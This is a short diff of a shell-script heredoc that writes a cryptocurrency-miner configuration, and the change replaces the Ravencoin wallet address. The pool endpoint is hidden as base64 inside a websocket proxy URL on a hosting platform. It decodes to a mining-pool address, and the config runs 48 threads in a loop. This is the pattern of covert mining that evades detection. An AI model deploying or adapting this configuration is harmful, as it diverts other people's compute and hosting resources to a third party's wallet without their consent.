@@ -13,7 +13,7 @@ while true; do
 {
   "proxy": "wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
   "config": { "threads": 48, "log": true },
-  "options": { "user": "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj", "password": "c=RVN", "argent": "robin" }
+  "options": { "user": "RXq1aLds5oKeqyTXAjiDZEghjXKw7ejJsi", "password": "c=RVN", "argent": "robin" }
 }
 EOF
 
